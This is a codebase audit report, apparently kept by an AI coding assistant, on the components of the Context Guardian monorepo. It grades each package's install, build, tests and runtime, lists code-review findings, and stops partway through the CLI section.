# Phase 00 — Codebase Audit Report

**Date**: 2026-02-17
**Branch**: `main`
**Purpose**: Exhaustive audit of every component in the Context Guardian monorepo to establish a baseline of what works, what's partial, and what's broken before MVP development begins.

**CLAUDE NOTE (for context after compaction)**:

- **ALL 10 COMPONENTS AUDITED.** Phase 00 audit is COMPLETE.
- Three living docs maintained in parallel:
  1. This file (`00_audit-report.md`) — detailed audit findings per component
  2. `docs/phase-01_MVP/00_interface-map.md` — exports, types, data flow, cross-component type gaps
  3. `docs/phase-01_MVP/01_issues-tracker.md` — consolidated fix list with P0-P3 priorities
- Also created `docs/phase-01_MVP/00_research-dependency-parser.md` — extensive research on dep parser
- No packages depend on each other directly — all connected through the CLI
- Key theme: each package defines its own types independently with incompatible shapes
- **Final counts: 11 P0, 33 P1, 43 P2, 30 P3 = 117 total issues**

**Methodology**: For each component we test:

- **Install** — `npm install` completes without errors
- **Build** — `npm run build` compiles successfully
- **Tests** — `npm test` passes, note coverage
- **Runtime** — core functionality executes as expected
- **Code Review** — inspect source for stubs, TODOs, incomplete logic, red flags

---

## Summary

| #   | Component          | Location                       | Install                 | Build | Tests | Runtime     | Verdict                    |
| --- | ------------------ | ------------------------------ | ----------------------- | ----- | ----- | ----------- | -------------------------- |
| 1   | Dependency Parser  | `packages/dependency-parser/`  | Pass                    | Pass  | 11/11 | Pass        | Working                    |
| 2   | AST Analyzer       | `packages/ast-analyzer/`       | Pass                    | Pass  | 7/7   | Partial     | Partial                    |
| 3   | Playbook Generator | `packages/playbook-generator/` | Pass                    | Pass  | 7/7   | Pass        | Working                    |
| 4   | API Server         | `services/api-server/`         | Pass                    | Pass  | 2/2   | Untested    | Partial                    |
| 5   | Offline Fallback   | `services/offline-fallback/`   | Pass                    | Pass  | 8/8   | DB exists   | Working                    |
| 6   | Database           | `database/`                    | N/A                     | N/A   | N/A   | Seeded      | Working                    |
| 7   | CLI                | `apps/cli/`                    | Pass                    | Pass  | 3/3   | Stub        | **Stub**                   |
| 8   | VS Code Extension  | `apps/vscode-extension/`       | Pass (8 moderate vulns) | Pass  | N/A   | Untested    | **Security Issue** + Shell |
| 9   | Landing Page       | `apps/landing/`                | Pass (pnpm)             | Pass  | 0/0   | Static only | **AI-Generated Shell**     |
| 10  | Data Crawler       | `tools/data-crawler/`          | Pass                    | Pass  | 0/0   | SQL fails   | **Broken**                 |

---

## 1. Dependency Parser

**Location**: `packages/dependency-parser/`
**Package**: `@context-guardian/dependency-parser@0.1.0`

### 1.1 Dependencies (Install)

**Status**: Pass

- `npm install` — 293 packages, 0 vulnerabilities
- Single runtime dep: `semver@^7.6.0`
- Dev deps: jest, ts-jest, ts-node, typescript, @types/jest, @types/node

### 1.2 Build

**Status**: Pass

- `tsc` compiles cleanly with zero errors
- Outputs to `dist/` with declarations (`.d.ts`), declaration maps, and source maps
- Target: ES2020, module: CommonJS, strict mode enabled

### 1.3 Tests

**Status**: Pass — 11/11 (2 suites)

| Suite              | Tests | Status |
| ------------------ | ----- | ------ |
| `detector.test.ts` | 4     | Pass   |
| `parsers.test.ts`  | 7     | Pass   |

- Tests use fixture projects in `examples/example-projects/` (react-app, python-app, rust-app)
- Coverage collection is configured in `jest.config.js` (`collectCoverageFrom`) but not auto-run on `npm test`
- No integration test for the top-level `analyzeDependencies()` function

### 1.4 Runtime

**Status**: Pass

- `analyzeDependencies()` correctly orchestrates: detect PM → parse config → return manifest
- Supports 3 ecosystems: Node (npm/yarn/pnpm), Python (pip), Rust (cargo)

### 1.5 Code Review

**Files**: 6 source files, 2 test files, 3 fixture projects

**Architecture** (clean separation):

- `index.ts` — orchestrator, re-exports all public API
- `detector.ts` — PM detection via lock file priority (pnpm > yarn > npm), then config file fallback
- `types.ts` — 5 well-defined interfaces
- `parsers/node.ts` — parses package.json, splits prod/dev deps, cleans version prefixes
- `parsers/python.ts` — parses requirements.txt, handles ==, >=, ~= operators
- `parsers/rust.ts` — simplified TOML parser (line-by-line, no library)

**Observations**:

- Rust parser is a hand-rolled line-by-line TOML parser (noted in comments as simplified). Will break on multi-line dep tables, inline tables with multiple keys, or workspace dependencies. Acceptable for MVP.
- Python parser regex `^([a-zA-Z0-9_-]+)(==|>=|<=|~=|>|<)?(.+)?$` doesn't handle extras syntax (e.g., `package[extra]>=1.0`) or environment markers (e.g., `; python_version>="3.8"`).
- `cleanVersion` handles `^`, `~`, `>=` prefixes and range/OR versions. Solid for common cases.
- No `pyproject.toml` or `setup.py` support — only `requirements.txt`.
- No `go.mod` support (Go not in scope for Phase 0).
- `fileExists()` utility in detector.ts is defined but never used.

**No stubs, no TODOs, no placeholder code.**

### 1.6 Verdict

**Working** — Fully functional for its stated scope. Clean code, good test coverage of core paths. Minor gaps (extras syntax, TOML edge cases, unused util) are acceptable for MVP. Ready to be consumed by the CLI.

---

## 2. AST Analyzer

**Location**: `packages/ast-analyzer/`
**Package**: `@context-guardian/ast-analyzer@0.1.0`

### 2.1 Dependencies (Install)

**Status**: Pass

- `npm install` — 330 packages, 0 vulnerabilities
- Runtime deps: `tree-sitter@^0.20.4`, `tree-sitter-javascript@^0.20.1`, `tree-sitter-typescript@^0.20.3`, `tree-sitter-python@^0.20.4`
- Dev deps: jest, ts-jest, ts-node, typescript, @types/jest, @types/node
- Note: tree-sitter is a native C++ addon (requires node-gyp/prebuild at install)

### 2.2 Build

**Status**: Pass

- `tsc` compiles cleanly, zero errors
- Requires custom `tree-sitter.d.ts` declaration file (bundled in `src/`)

### 2.3 Tests

**Status**: Pass — 7/7 (1 suite)

| Suite                       | Tests | Status |
| --------------------------- | ----- | ------ |
| `pattern-detection.test.ts` | 7     | Pass   |

- Tests use **mock FileAnalysis objects**, NOT actual tree-sitter parsing
- No integration test that parses a real file end-to-end
- No test for `ASTAnalyzer.analyzeProject()` orchestrator
- No test for `JavaScriptAnalyzer` (import/export/function/class/hook extraction)
- No test for `TreeSitterWrapper` (parser initialization, extension routing)
- Tests only cover detectors (state management, component style, framework)

### 2.4 Runtime

**Status**: Partial

- Tree-sitter parser initializes and parses JS/TS/Python files
- `analyzeProject()` orchestrates file collection → parse → detect patterns
- However: only a `JavaScriptAnalyzer` exists — **no Python analyzer despite `tree-sitter-python` being a dependency**
- The `FileAnalysis.language` type includes `'python'` but nothing produces Python analyses

### 2.5 Code Review

**Files**: 8 source files (including `tree-sitter.d.ts`), 1 test file, 1 example project (single file)

**Architecture**:

```
index.ts (ASTAnalyzer class — orchestrator)
├── parsers/tree-sitter-wrapper.ts    — language router (JS/TS/Python)
├── parsers/javascript-analyzer.ts    — extracts imports, exports, functions, classes, hooks
├── detectors/state-management-detector.ts  — import string matching
├── detectors/component-style-detector.ts   — functional vs class ratio
├── detectors/framework-detector.ts         — import string matching
└── types.ts                                — 6 interfaces
```

**Observations**:

1. **No Python analysis class**: `TreeSitterWrapper` correctly routes `.py` files to `tree-sitter-python` for parsing, but `ASTAnalyzer.analyzeFile()` always passes the resulting tree to `JavaScriptAnalyzer` regardless of extension. The tree is parsed with the Python grammar but then analyzed expecting JS AST node types (`import_statement`, `function_declaration`, etc.), which will silently fail to extract anything useful. A `PythonAnalyzer` class is needed.

2. **Framework detection is naive**: Uses `imp.includes(framework)` substring matching. This means:
   - `import 'react-native'` matches `react` (false positive)
   - `import 'express-session'` matches `express` (false positive)
   - `import '@nestjs/core'` matches `nest` (correct, but only by accident — `nest` is a substring of `nestjs`)
   - `import 'next/router'` matches `next` (correct but fragile)

3. **State management detection is also substring-based**: `imp.includes('redux')` would match `redux-persist`, `redux-saga`, etc. — which is actually fine since those ARE Redux-related. But `imp.includes('zustand')` wouldn't catch `zustand/middleware`.

4. **Component style detection has a logic gap**: It counts `functionalCount` by adding ALL functions in a file IF the file has any hooks. A utility file with 20 helper functions and one `useState` call would count as 20 functional components.

5. **`commonImports` only tracks relative imports** (lines 122-127 of index.ts): It filters to imports starting with `.` or `/`. External package imports (which are far more useful for pattern detection) are excluded from this metric.

6. **File traversal is synchronous**: `collectFiles` uses `fs.readdirSync` and `analyzeFile` uses `fs.readFileSync`. Fine for MVP, but will block on large codebases.

7. **No `require()` detection**: Only `import_statement` AST nodes are extracted. CommonJS `require()` calls are ignored, missing patterns in older codebases.

8. **Single example file**: `examples/sample-react-project/src/App.tsx` — just one file, minimal for validation.

9. **`maxFiles` cap**: Respects a limit (default not set), but stops mid-traversal — files found depend on directory traversal order (filesystem-dependent).

**No stubs or TODOs in code, but the Python path is effectively dead code.**

### 2.6 Verdict

**Partial** — The JS/TS analysis pipeline works end-to-end (parse → analyze → detect patterns), and all 7 tests pass. However, there are meaningful gaps:

- Python parsing works (tree-sitter-python) but no Python analysis class exists — JS analyzer is applied to Python ASTs
- Detection logic is substring-based and produces false positives
- Tests only cover detectors with mock data, not actual parsing
- No `require()` support for CommonJS codebases
- Component style heuristic is flawed

Functional enough to produce useful signals for a JS/TS React project, but needs significant work for production accuracy and multi-language support.

---

## 3. Playbook Generator

**Location**: `packages/playbook-generator/`
**Package**: `@context-guardian/playbook-generator@0.1.0`

### 3.1 Dependencies (Install)

**Status**: Pass

- `npm install` — 285 packages, 0 vulnerabilities
- Single runtime dep: `handlebars@^4.7.8`
- Dev deps: jest, ts-jest, tsx, typescript, @types/jest, @types/node

### 3.2 Build

**Status**: Pass

- `tsc` compiles cleanly, zero errors

### 3.3 Tests

**Status**: Pass — 7/7 (1 suite)

| Suite                        | Tests | Status |
| ---------------------------- | ----- | ------ |
| `markdown-formatter.test.ts` | 7     | Pass   |

- Tests cover: base template, cursor template, offline mode, severity grouping, patterns inclusion, library count, security count
- Tests use mock `PlaybookInput` data with realistic rule structures
- No snapshot tests for template output (would catch unintended formatting changes)

### 3.4 Runtime

**Status**: Pass

- `MarkdownFormatter` initializes, loads templates, registers Handlebars helpers
- `generate()` accepts `PlaybookInput` + `PlaybookOptions`, returns `PlaybookOutput` with markdown string and metadata
- Both `base.hbs` and `cursor.hbs` templates render correctly

### 3.5 Code Review

**Files**: 3 source files, 2 Handlebars templates, 1 test file, 1 example script

**Architecture**:

```
index.ts                           — re-exports MarkdownFormatter + all types
├── formatters/markdown-formatter.ts — main class: loads templates, groups rules, generates output
├── templates/base.hbs              — full playbook (sections by severity, code examples, links)
├── templates/cursor.hbs            — compact cursor-compatible format (emoji prefixes, minimal)
└── types.ts                        — 6 interfaces (BestPractice, ProjectPattern, Dependency, PlaybookInput, PlaybookOptions, PlaybookOutput)
```

**Observations**:

1. **Type mismatch with ast-analyzer**: Playbook generator's `ProjectPattern.stateManagement` is `string[]` (array), but ast-analyzer's `ProjectPatterns.stateManagement` is `string | undefined` (single value). Similarly, ast-analyzer outputs `componentStyle` as a bare string, and playbook generator expects `'functional' | 'class' | 'mixed'` — compatible but not imported from a shared source. These types are **defined independently** in each package with no shared types package.

2. **`PlaybookInput.rules` is the key data flow bottleneck**: The `BestPractice` interface has `library_id`, `type`, `severity`, `min_version`, `max_version`, etc. This must come from either the API server or the offline fallback. The shape implies a database row — fields like `id`, `library_id` are clearly DB primary/foreign keys.

3. **Template loads from `__dirname`-relative path**: `path.join(__dirname, '../templates')` works when running from `dist/` (compiled), but the path resolution depends on the build output structure. If the package is bundled differently (e.g., esbuild single file), templates won't be found.

4. **Handlebars helpers are registered globally**: `Handlebars.registerHelper()` modifies the global Handlebars instance. If multiple MarkdownFormatter instances are created, or if another library uses Handlebars, helpers could collide.

5. **Code examples use triple-stash `{{{code_example}}}`**: This is correct — Handlebars triple-stash disables HTML escaping, which is needed for code blocks. No XSS risk since output is a `.md` file, not HTML.

6. **`countUniqueLibraries` counts from dependencies, not from rules**: It uses `dependencies.map(d => d.name)` — which counts packages in the project, NOT the libraries that matched rules. These are different numbers. A project may have 50 deps but only 3 have rules.

7. **Cursor template is notably simpler**: Uses emoji prefixes (`🚨 CRITICAL`, `⚠️`, `💡`), no source URLs, no low-priority section. This is intentional for Cursor's context window constraints.

8. **`hasCritical` helper is defined but used awkwardly**: In `base.hbs` line 66-71, `{{#if hasCritical}}{{else}}✅ No critical issues{{/if}}` — it shows "no critical issues" only in the else branch. The if-true branch is empty. Works but reads oddly.

9. **Version hardcoded to `'0.1.0'`**: Line 87 of markdown-formatter.ts sets `version: '0.1.0'` directly instead of reading from package.json.

**No stubs, no TODOs, no placeholder code.**

### 3.6 Verdict

**Working** — Cleanly designed, tests cover the core output scenarios. The Handlebars template approach is sound and extensible. Main concerns are the type mismatch with ast-analyzer (will cause integration issues), the `__dirname`-relative template loading (fragile under bundling), and the lack of a shared types package across components.

---

## 4. API Server

**Location**: `services/api-server/`
**Package**: `@context-guardian/api-server@0.1.0`

### 4.1 Dependencies (Install)

**Status**: Pass

- `npm install` — 299 packages, 0 vulnerabilities
- Runtime deps: `hono@^4.0.0`, `@hono/node-server@^1.8.0`, `postgres@^3.4.0`, `ioredis@^5.3.0`, `zod@^3.22.0`, `dotenv@^16.4.0`, `semver@^7.7.4`, `@types/semver@^7.7.1`
- Note: `@types/semver` is in `dependencies` not `devDependencies` (minor packaging issue — should be devDep)

### 4.2 Build

**Status**: Pass

- `tsc` compiles cleanly, zero errors

### 4.3 Tests

**Status**: Pass — 2/2 (1 suite), but with a logged error

| Suite                      | Tests | Status                    |
| -------------------------- | ----- | ------------------------- |
| `playbook-service.test.ts` | 2     | Pass (with console.error) |

- Test 1: "returns cached response if available" — mocks cache.get to return data, verifies `cacheHit: true`
- Test 2: "generates new response if not cached" — mocks cache miss, but the DB mock is broken: `mockGetClient` returns an object with a ` '`' `` key that doesn't match how `postgres.js` tagged template literals work. The actual SQL query (`sql\`...\``) calls `sql` as a function, but the mock returns a plain object. This causes `TypeError: sql is not a function` which is caught and logged (line 76 of playbook-service.ts). The test still passes because the catch block swallows the error and returns an empty rules array.
- **The "generates new response" test is not actually testing DB queries** — it's testing that errors are swallowed gracefully
- No tests for routes, middleware, validation, auth, or error handler
- No integration test with a real or in-memory database

### 4.4 Runtime

**Status**: Untested (requires PostgreSQL + Redis)

- Server requires `DATABASE_URL` and `REDIS_URL` environment variables
- Startup sequence: connect to DB → health check → connect to Redis → health check → mount routes → listen
- Cannot start without live database connection (hard exit on DB health check failure)
- Redis failure is non-fatal (logs warning, continues with degraded mode)

### 4.5 Code Review

**Files**: 9 source files, 1 test file, Dockerfile, fly.toml, .env.example

**Architecture**:

```
index.ts                              — app bootstrap: middleware → DB → cache → routes → serve
├── db/connection.ts                  — postgres.js wrapper (singleton, connection pool max=10)
├── db/cache.ts                       — ioredis wrapper (singleton, 24h TTL, lazy connect)
├── middleware/auth.ts                — Bearer token API key check (skips if API_KEY unset)
├── middleware/validation.ts          — Zod schema validation for request body
├── middleware/error-handler.ts       — global error handler (hides details in production)
├── routes/api.ts                     — POST /api/v1/generate-playbook, GET /api/v1/health
├── services/playbook-service.ts      — core logic: cache check → DB queries → version filter → response
└── types.ts                          — 8 interfaces (request, response, DB row types)
```

**Observations**:

1. **Request schema (`GeneratePlaybookRequest`)**: Expects `packageManager`, `dependencies[]`, optional `projectName`, `projectVersion`, and `patterns` (matching ast-analyzer's `ProjectPatterns` shape exactly). This is the contract the CLI must fulfill.

2. **Response schema (`GeneratePlaybookResponse`)**: Returns `rules: PlaybookRule[]`, `generatedAt`, `cacheHit`. The `PlaybookRule` type is **different from** the playbook-generator's `BestPractice` type:
   - API returns: `PlaybookRule` with `type`, `id` (string), `library_id` (string), `library_name`, `title`, `description`, `severity`, `category`, `version_range`, `code_example`, `source_url`
   - Playbook generator expects: `BestPractice` with `type`, `id` (number), `library_id` (number), `title`, `description`, `severity`, `category`, `code_example`, `source_url`, `min_version`, `max_version`, `library_name`
   - **Mismatches**: `id`/`library_id` types (string vs number), `version_range` (single field) vs `min_version`/`max_version` (two fields)

3. **Semver version filtering is well-implemented**: Uses `semver.coerce()` to clean version strings, then `semver.satisfies()` to check against `version_range`. Falls back to including the rule if parsing fails (safe default). Security advisories use separate `isVersionAffected()` method.

4. **SQL queries use tagged template literals** (postgres.js parameterized queries): `sql\`...WHERE l.name = ${dep.name}\`` — this is safe from SQL injection.

5. **Three separate DB queries per dependency**: For N dependencies, the server makes 3N database queries (best practices + anti-patterns + security advisories). No batching or parallelization — queries are sequential within each dependency. Could be a performance issue with many deps.

6. **Cache key is SHA-256 hash of sorted dependencies + patterns**: Deterministic and collision-resistant. Cache TTL defaults to 86400 seconds (24 hours).

7. **Auth middleware skips if `API_KEY` env var is unset**: Good for development, but means the production endpoint is unprotected if someone forgets to set the env var. No runtime warning about this.

8. **Port mismatch**: Dockerfile exposes port 3000, fly.toml sets `PORT=8080` and `internal_port=8080`. The app reads `process.env.PORT || '3000'`. This works because fly.toml's `[env]` sets PORT=8080 at runtime, but the Dockerfile EXPOSE is misleading.

9. **Dockerfile uses `npm ci --only=production`**: The `--only=production` flag is deprecated in npm 7+ (use `--omit=dev` instead). Should still work but may produce warnings.

10. **Anti-patterns are hardcoded to severity `'medium'`**: Line 167 of playbook-service.ts — all anti-patterns get `severity: 'medium' as const` regardless of their actual impact.

11. **`patterns` field from the request is included in cache key but never used in DB queries**: The patterns are part of the cache hash but don't influence which rules are fetched. The server only queries based on dependency name + version. This means pattern-specific rules are not supported by the API (yet).

12. **Graceful shutdown handler** calls `getDatabase()` and `getCache()` singletons — works because they're already initialized. Clean.

13. **No rate limiting** on the API endpoint.

### 4.6 Verdict

**Partial** — The architecture is sound: Hono framework, Zod validation, postgres.js parameterized queries, Redis caching with deterministic hashing, semver version filtering, Docker + Fly.io deployment config. However:

- Tests are minimal (2 tests, one has a broken DB mock that silently passes)
- Cannot verify runtime without a live DB
- Response type (`PlaybookRule`) doesn't match playbook-generator's expected input (`BestPractice`) — id types, version field structure differ
- 3N sequential DB queries per request (no batching)
- Patterns from ast-analyzer are cached but never used in query logic
- Anti-pattern severity is hardcoded
- No rate limiting

---

## 5. Offline Fallback

**Location**: `services/offline-fallback/`
**Package**: `@context-guardian/offline-fallback@0.1.0`

### 5.1 Dependencies (Install)

`npm install` — **Pass** (246 packages, 0 vulnerabilities)

Runtime dependencies:

- `better-sqlite3` — SQLite3 native binding (C++ addon, prebuilt binary)
- `postgres` — PostgreSQL client (same as api-server, used only in export script)
- `semver` — Version range matching
- `dotenv` — Environment variable loading
- `@types/semver` — Should be in devDependencies (same issue as api-server, issue 4.9)

Dev dependencies: `@types/better-sqlite3`, `@types/jest`, `@types/node`, `jest`, `ts-jest`, `tsx`, `typescript`

### 5.2 Build

`npm run build` — **Pass** (tsc compiles cleanly)

Outputs to `dist/`. Only `src/` is compiled — `scripts/` are excluded from tsconfig (run via `tsx` directly).

### 5.3 Tests

`npm test` — **8/8 pass** (1 suite: `offline-client.test.ts`)

Tests create a real in-memory SQLite database with schema + seed data, then exercise every public method:

- `queryBestPractices` — finds rules, filters by semver version range
- `queryAntiPatterns` — finds patterns for a library
- `querySecurityAdvisories` — finds CVEs, filters by affected_versions
- `queryAllRules` — combined query, sorts by severity
- `hasLibrary` — existence check
- `getMetadata` / `getStats` — metadata and counts

**Good**: Tests are thorough. They test version filtering both ways (matching and non-matching versions). Test DB is cleaned up in afterAll.

### 5.4 Runtime

Cannot run the export script (`npm run export`) without live PostgreSQL. However, a pre-exported SQLite database exists at `data/offline-fallback.db` with real data from Supabase:

- 3 libraries (react, next, express)
- 11 best practices, 5 anti-patterns, 1 security advisory
- Exported 2026-02-17

The `OfflineClient` class itself works — the tests prove it against a real SQLite database (not mocked).

### 5.5 Code Review

**Architecture**: Two-phase design:

1. **Export phase** (`scripts/export-from-postgres.ts`) — Connects to PostgreSQL (Supabase), fetches top N libraries + all their rules, writes to SQLite file. Run periodically to refresh offline data.
2. **Client phase** (`src/offline-client.ts`) — Reads from SQLite file, queries rules by library name + version. This is what the CLI uses at runtime.

**Key observations**:

1. **`PlaybookRule` type matches API server's `PlaybookRule` exactly** — Same field names, same string IDs, same `version_range` field. This is deliberate: the offline fallback is designed to produce the same response shape as the API, so the CLI can use either interchangeably.

2. **Anti-pattern severity hardcoded to `'medium'`** (line 43) — Same issue as the API server (issue 4.5). The `anti_patterns` table has no `severity` column, so it's hardcoded.

3. **Anti-pattern description is enriched** — Injects `**Why it's bad:**` and `**Better approach:**` markdown into the description string. Same pattern as the API server. Good consistency.

4. **Anti-pattern code examples combine bad+good** — `code_example_bad` and `code_example_good` are concatenated with `// Bad:` and `// Good:` comments. Same as API server.

5. **Version filtering is client-side** — All rules for a library are fetched from SQLite, then filtered in JS using `semver.satisfies()`. This is correct for SQLite (no semver function in SQL), but means all rows are loaded into memory per library.

6. **`filterByVersion` silently includes rules with unparseable version ranges** — On semver parse failure, returns `true` (assumes affected). This is a safe default for security advisories but may include irrelevant best practices.

7. **Security advisory version filtering is duplicated** — `querySecurityAdvisories` has its own inline version filter (lines 176-183) instead of using the shared `filterByVersion` helper. The logic is identical but uses `advisory.affected_versions` instead of `row.version_range`. Minor code duplication.

8. **Export script hardcodes version to `'0.1.0'`** — Same as playbook-gen (issue 3.5). Should read from package.json.

9. **Export script logs the database host to metadata** — `DATABASE_URL.split('@')[1]` extracts the host portion. Safe, but fragile string parsing.

10. **`Dependency` type is minimal** — Only `name` and `version`. No `isDev` field. This is fine for the offline client's purpose (rule lookup doesn't depend on dev/prod distinction).

11. **`@types/semver` in dependencies** — Should be in devDependencies (types aren't needed at runtime). Same issue as api-server.

12. **No `queryMultipleDependencies` test** — The method exists but isn't directly tested. It's trivially correct (loops over `queryAllRules`), but untested.

13. **`.env` contains real Supabase credentials** — The `.env` file has the actual PostgreSQL connection string with password. The `.gitignore` correctly excludes `.env`, but the `.env` file exists on disk with real credentials. This is expected for the export script but worth noting.

14. **Schema uses TEXT for UUIDs** — SQLite doesn't have a UUID type, so all IDs are TEXT. This matches the PostgreSQL UUID columns correctly when exported.

15. **Export script uses transactions** — Good. Wraps inserts in `db.transaction()` for atomicity and performance.

16. **No incremental export** — The export deletes the existing DB file and recreates from scratch. For 100 libraries this is fine, but won't scale to thousands.

### 5.6 Verdict

**Working** — This is one of the better-built components. Install, build, and all 8 tests pass. The SQLite client is well-structured with proper version filtering. The export script is functional but requires PostgreSQL access. The `PlaybookRule` output type intentionally matches the API server's response, making the CLI's job easier (same shape from either source). Main issues are the hardcoded anti-pattern severity (shared with API server) and minor code quality items.

---

## 6. Database

**Location**: `database/`

### 6.1 Schema Review

**Location**: `database/migrations/20260211000001_initial_schema.sql` (also duplicated at `database/supabase/migrations/`)

**Tables** (4 data tables + triggers):

| Table                 | Primary Key                | Key Columns                                                                                                                            | Notes                                                                                       |
| --------------------- | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `libraries`           | UUID (`gen_random_uuid()`) | `name` (UNIQUE), `ecosystem`, `official_docs_url`, `repository_url`, `description`                                                     | Has `pg_trgm` extension enabled for fuzzy search                                            |
| `best_practices`      | UUID                       | FK `library_id`, `title`, `description`, `category`, `severity`, `version_range`, `code_example`, `source_url`                         | `severity` CHECK constraint, `category` CHECK constraint                                    |
| `anti_patterns`       | UUID                       | FK `library_id`, `pattern_name`, `description`, `why_bad`, `better_approach`, `version_range`, `code_example_bad`, `code_example_good` | **No severity column** — this is why API server and offline-fallback hardcode to `'medium'` |
| `security_advisories` | UUID                       | FK `library_id`, `cve_id`, `severity`, `affected_versions`, `fixed_in_version`, `source_url`, `published_at`                           | `severity` CHECK constraint                                                                 |

**Indexes**: Proper indexes on `library_id`, `name`, `ecosystem`, `severity`, `cve_id`.

**Triggers**: `update_updated_at_column()` trigger on `libraries`, `best_practices`, `anti_patterns` (NOT on `security_advisories` — no `updated_at` column there).

**Key observations**:

1. **`anti_patterns` table has no `severity` column** — This is the root cause of issue 4.5 and 5.1. The API server and offline fallback both hardcode severity to `'medium'` because the DB schema simply doesn't store it. To fix 4.5/5.1, a migration adding `severity` to `anti_patterns` is needed.

2. **`best_practices.category` has a CHECK constraint** limiting values to: `'security'`, `'performance'`, `'maintainability'`, `'best-practice'`, `'anti-pattern'`, `'deprecation'`. This is fine but note `'anti-pattern'` is a valid category for best_practices — separate from the `anti_patterns` table.

3. **`best_practices.version_range` is NOT NULL** — but the offline-fallback's `BestPractice` type has `version_range?: string` (optional). The SQLite schema also allows NULL. This means the exported SQLite data could have NULL version_range even though PostgreSQL doesn't. However, looking at the seed data, all rows have version_range values.

4. **No `version_range` NOT NULL constraint on `anti_patterns`** — It's nullable, which is correct (some anti-patterns apply to all versions).

5. **UUIDs use `gen_random_uuid()`** — Correct per CLAUDE.md instructions (not `uuid_generate_v4()`).

6. **`ON DELETE CASCADE`** on all foreign keys — Deleting a library removes all its rules. Good.

7. **No full-text search indexes** — `pg_trgm` is enabled but no GIN/GiST indexes using it. The extension is loaded but unused.

8. **No `updated_at` trigger on `security_advisories`** — The table has `created_at` but no `updated_at`. Intentional or oversight? Advisories may be considered immutable once published.

### 6.2 Migrations

Single migration file: `20260211000001_initial_schema.sql`

- Located in both `database/migrations/` and `database/supabase/migrations/` — identical files (verified with diff).
- The duplicate is expected: `migrations/` is the canonical source, `supabase/migrations/` is for `supabase db push`.
- No subsequent migrations exist. The schema hasn't evolved since initial creation.

### 6.3 Seeds

Three seed files in `database/seeds/`:

| File                   | Library | Best Practices | Anti-Patterns | Security Advisories |
| ---------------------- | ------- | -------------- | ------------- | ------------------- |
| `001_react_seed.sql`   | react   | 5              | 2             | 1                   |
| `002_nextjs_seed.sql`  | next    | 3              | 2             | 0                   |
| `003_express_seed.sql` | express | 3              | 1             | 0                   |

**Totals**: 3 libraries, 11 best practices, 5 anti-patterns, 1 security advisory — matches the exported SQLite DB exactly.

**Supabase seed**: `database/supabase/seed.sql` is a concatenation of all three seed files (identical content). Used by `supabase db reset`.

**Seed data quality**:

- All manually curated, high-quality content with real source URLs
- Version ranges are correct semver expressions
- Code examples use proper escaping (`E'...'` syntax)
- `ON CONFLICT (name) DO NOTHING` prevents duplicate inserts
- Uses `DO $$ DECLARE ... BEGIN ... END $$;` blocks to capture library UUID for subsequent inserts
- The React security advisory uses `CVE-2024-EXAMPLE` — a placeholder, not a real CVE

**Key concern**: Only 3 libraries seeded. For MVP, the data-crawler (component 10) needs to populate many more.

### 6.4 Verdict

**Working** — The schema is well-designed with proper constraints, indexes, cascading deletes, and auto-updated timestamps. The seed data is manually curated and high quality. The main structural issue is the missing `severity` column on `anti_patterns` — this is the root cause of the hardcoded `'medium'` severity in both the API server and offline fallback. The `pg_trgm` extension is loaded but unused (no fuzzy search indexes).

---

## 7. CLI

**Location**: `apps/cli/`
**Package**: `context-guardian@0.1.0`

### 7.1 Dependencies (Install)

`npm install` — **Pass** (248 packages, 0 vulnerabilities)

Runtime dependencies:

- `commander` — CLI framework (argument parsing, subcommands)
- `chalk` v4 — Terminal colors (pinned to v4 for CJS compatibility)
- `ora` v5 — Terminal spinner (pinned to v5 for CJS compatibility)
- `axios` — HTTP client for API calls

**Note**: No imports from dependency-parser, ast-analyzer, playbook-generator, or offline-fallback. The CLI is entirely standalone — it does NOT use the other packages as dependencies.

### 7.2 Build

`npm run build` — **Pass** (tsc compiles cleanly)

Uses CommonJS (`module: "commonjs"`) unlike the other packages which use ESNext. This is correct for a CLI tool that runs via `node dist/cli.js`.

Binary entry points: `guardian` and `context-guardian` both point to `dist/cli.js`.

### 7.3 Tests

`npm test` — **3/3 pass** (1 suite: `playbook-generator.test.ts`)

Tests only cover the CLI's own `PlaybookGenerator` class (which formats rules as markdown). No tests for:

- Commands (init, sync, validate)
- API client
- Config loading/validation

### 7.4 Runtime

`guardian init` generates a `.guardian.md` file, but with **hardcoded mock data** — it does not actually call the API, parse dependencies, or analyze the project. The command is a working shell with TODOs.

`guardian sync` — prints success but does nothing (all TODOs).

`guardian validate` — only checks if `.guardian.md` exists and its age.

### 7.5 Code Review

**This is the critical integration point** — the CLI is supposed to be the glue connecting all packages. Currently it's almost entirely stubbed.

**File-by-file analysis**:

1. **`cli.ts`** — Main entry point. Registers 3 commands (init, sync, validate) using Commander. Clean structure.

2. **`commands/init.ts`** — The core command. Should:
   - Detect package manager → uses dependency-parser
   - Parse dependencies → uses dependency-parser
   - Analyze project patterns → uses ast-analyzer
   - Call API or use offline fallback → uses api-client or offline-fallback
   - Generate playbook → uses playbook-generator

   **Currently**: All steps are TODOs. Returns a hardcoded mock response with one placeholder rule. Imports `ApiClient` and `PlaybookGenerator` (CLI's own) but only uses the generator with mock data. Does NOT import or use dependency-parser, ast-analyzer, playbook-generator (package), or offline-fallback.

3. **`commands/sync.ts`** — Should re-analyze and update `.guardian.md`. **Currently**: All TODOs. Prints success but does nothing.

4. **`commands/validate.ts`** — Should compare current deps against playbook metadata. **Currently**: Only checks file existence and age (> 7 days = stale).

5. **`utils/api-client.ts`** — Functional HTTP client using axios. Posts to `/api/v1/generate-playbook`. Has health check endpoint. Error handling for network/HTTP errors. **This is actually implemented**, just never called from any command.

6. **`utils/config.ts`** — Reads from env vars (`GUARDIAN_API_URL`, `GUARDIAN_API_KEY`, `GUARDIAN_OFFLINE`, `GUARDIAN_VERBOSE`). Default API URL: `https://api.contextguardian.dev`. Config validation checks URL format.

7. **`utils/logger.ts`** — Simple chalk-based logger with info/success/warn/error/debug levels. Works.

8. **`utils/playbook-generator.ts`** — This is the CLI's **own** playbook generator, completely separate from `packages/playbook-generator/`. It's a simple markdown formatter — no Handlebars templates, no cursor-compatible mode, no offline metadata. Takes `PlaybookResponse` (CLI type) and writes `.guardian.md`.

9. **`types/index.ts`** — Defines its own types:
   - `Dependency` — has `isDev?` (compatible with dep-parser)
   - `AnalysisPayload` — has `packageManager`, `dependencies`, `projectName?`, `projectVersion?`, `patterns?`
   - `ProjectPatterns` — has `stateManagement?: string` (single string like ast-analyzer, NOT string[] like playbook-gen)
